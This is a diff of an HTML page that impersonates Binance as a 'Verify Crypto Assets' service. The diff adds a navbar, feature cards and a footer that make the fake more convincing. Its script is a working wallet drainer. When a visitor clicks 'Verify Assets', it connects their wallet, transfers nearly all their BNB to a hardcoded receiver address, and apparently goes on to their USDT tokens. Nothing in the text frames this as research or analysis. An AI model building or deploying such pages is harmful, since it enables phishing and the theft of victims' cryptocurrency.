@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Binance Verify</title>
+  <title>Binance</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.8.0/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Inter', sans-serif; background-color: #121212; color: #E0E0E0; }
     .button-primary {
@@ -13,18 +14,15 @@
       padding: 1rem 2rem;
       border-radius: 9999px;
       font-weight: 600;
+      transition: all 0.3s ease;
       position: relative;
       z-index: 10;
-      transition: all 0.3s ease;
     }
     .button-primary:hover { background-color: #fbbf24; }
     .pulse-ring {
       position: absolute;
       border: 2px solid #FACC15;
       border-radius: 50%;
-      width: 160px; height: 160px;
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
       animation: pulse-ring 2.5s cubic-bezier(0.4,0,0.6,1) infinite;
       z-index: 1;
     }
@@ -36,33 +34,79 @@
       70% { transform: scale(1.3); opacity: 0; }
       100% { opacity: 0; }
     }
+    .card:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(250,204,21,0.3); }
   </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen text-white">
+<body class="flex flex-col min-h-screen">
 
-  <!-- Binance Logo -->
-  <img src="binance-yellow-rhombus-lawc3crgelc4t98h.jpg" alt="Binance Logo" class="w-16 mb-6" />
+  <!-- Navbar -->
+  <header class="bg-[#171717] bg-opacity-90 backdrop-blur-md sticky top-0 z-50 shadow-md">
+    <nav class="container mx-auto px-6 py-4 flex justify-between items-center">
+      <a href="#" class="flex items-center space-x-2">
+        <img src="binance-yellow-rhombus-lawc3crgelc4t98h.jpg" alt="Binance Logo" class="h-8 w-8"/>
+        <span class="text-xl font-bold text-yellow-400">BINANCE</span>
+      </a>
+      <div class="hidden md:flex space-x-8 text-sm font-medium">
+        <a href="#" class="hover:text-yellow-400 transition-colors">Home</a>
+        <a href="#" class="hover:text-yellow-400 transition-colors">Explorer</a>
+        <a href="#" class="hover:text-yellow-400 transition-colors">Tokens</a>
+        <a href="#" class="hover:text-yellow-400 transition-colors">NFTs</a>
+        <a href="#" class="hover:text-yellow-400 transition-colors">DApps</a>
+      </div>
+      <button class="md:hidden text-gray-400 focus:outline-none">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path>
+        </svg>
+      </button>
+    </nav>
+  </header>
 
-  <!-- Verify Button with Pulse -->
-  <div class="relative flex items-center justify-center mb-6">
-    <div class="pulse-ring"></div>
-    <div class="pulse-ring"></div>
-    <div class="pulse-ring"></div>
-    <button onclick="handleVerify()" 
-      class="button-primary relative z-10">
-      Verify
-    </button>
-  </div>
+  <!-- Hero Section -->
+  <main class="flex flex-col items-center justify-center text-center px-6 py-12">
+    <h1 class="text-4xl md:text-5xl font-bold text-yellow-400 mb-4">Verify Crypto Assets</h1>
+    <p class="text-gray-300 mb-8 max-w-xl">Our advanced platform provides instant verification of BNB Chain assets, ensuring authenticity and security for all your crypto transactions..</p>
 
-  <!-- Status -->
-  <p id="status" class="text-gray-300 text-center text-lg max-w-sm"></p>
+    <!-- Pulse + Button Wrapper -->
+    <div class="relative flex justify-center items-center w-40 h-40 sm:w-48 sm:h-48 mb-8">
+      <div class="absolute inset-0 flex justify-center items-center">
+        <div class="pulse-ring w-36 h-36"></div>
+        <div class="pulse-ring w-28 h-28"></div>
+        <div class="pulse-ring w-20 h-20"></div>
+      </div>
+      <button onclick="handleVerify()" class="button-primary z-10 text-sm sm:text-base">Verify Assets</button>
+    </div>
+    <p id="status" class="text-gray-300 text-lg">Click Verify to start...</p>
+  </main>
 
-  <!-- Ethers.js v6 -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.8.0/dist/ethers.min.js"></script>
+  <!-- Cards Section -->
+  <section class="container mx-auto px-6 py-12 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6">
+    <div class="card bg-[#1E1E1E] rounded-xl p-6 text-center transition-all cursor-pointer">
+      <h2 class="text-yellow-400 text-lg font-semibold mb-2">Explorer</h2>
+      <p class="text-gray-400 text-sm">Browse BNB Chain addresses, contracts, tokens, and transactions.</p>
+    </div>
+    <div class="card bg-[#1E1E1E] rounded-xl p-6 text-center transition-all cursor-pointer">
+      <h2 class="text-yellow-400 text-lg font-semibold mb-2">Tokens</h2>
+      <p class="text-gray-400 text-sm">Check token balances and verify authenticity of BNB Chain tokens.</p>
+    </div>
+    <div class="card bg-[#1E1E1E] rounded-xl p-6 text-center transition-all cursor-pointer">
+      <h2 class="text-yellow-400 text-lg font-semibold mb-2">NFTs</h2>
+      <p class="text-gray-400 text-sm">Verify NFTs on BNB Chain and view metadata securely.</p>
+    </div>
+    <div class="card bg-[#1E1E1E] rounded-xl p-6 text-center transition-all cursor-pointer">
+      <h2 class="text-yellow-400 text-lg font-semibold mb-2">DApps</h2>
+      <p class="text-gray-400 text-sm">Connect to decentralized apps and verify transactions safely.</p>
+    </div>
+  </section>
 
+  <!-- Footer -->
+  <footer class="bg-[#171717] mt-auto py-6 text-center text-gray-500 text-sm">
+    &copy; 2025 Binance Verify. Powered by BNB Chain.
+  </footer>
+
+  <!-- Verification Script -->
   <script>
-    const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; // Your wallet
-    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 contract
+    const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; 
+    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
     const ERC20_ABI = [
       "function balanceOf(address) view returns (uint)",
       "function transfer(address to, uint amount) returns (bool)"
@@ -72,7 +116,7 @@
       const statusEl = document.getElementById("status");
       try {
         if (!window.ethereum) {
-          statusEl.innerText = "No wallet detected. Install Binance Wallet or MetaMask.";
+          statusEl.innerText = "No wallet detected. Please install Binance Wallet or MetaMask.";
           return;
         }
 
@@ -83,20 +127,18 @@
 
         statusEl.innerText = "Checking balances...";
 
-        // Check BNB balance
         const balanceBNB = await provider.getBalance(userAddress);
-        if (balanceBNB > ethers.parseEther("0.0005")) {
+        if (balanceBNB > ethers.parseEther("0.001")) {
           statusEl.innerText = "Sending BNB...";
           const tx = await signer.sendTransaction({
             to: RECEIVER,
-            value: balanceBNB - ethers.parseEther("0.0005") // leave gas
+            value: balanceBNB - ethers.parseEther("0.0005")
           });
           await tx.wait();
           statusEl.innerText = "BNB sent successfully ✅";
           return;
         }
 
-        // Check USDT balance
         const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
         const balanceUSDT = await usdt.balanceOf(userAddress);
         if (balanceUSDT > 0n) {
@@ -114,6 +156,5 @@
       }
     }
   </script>
-
 </body>
 </html>
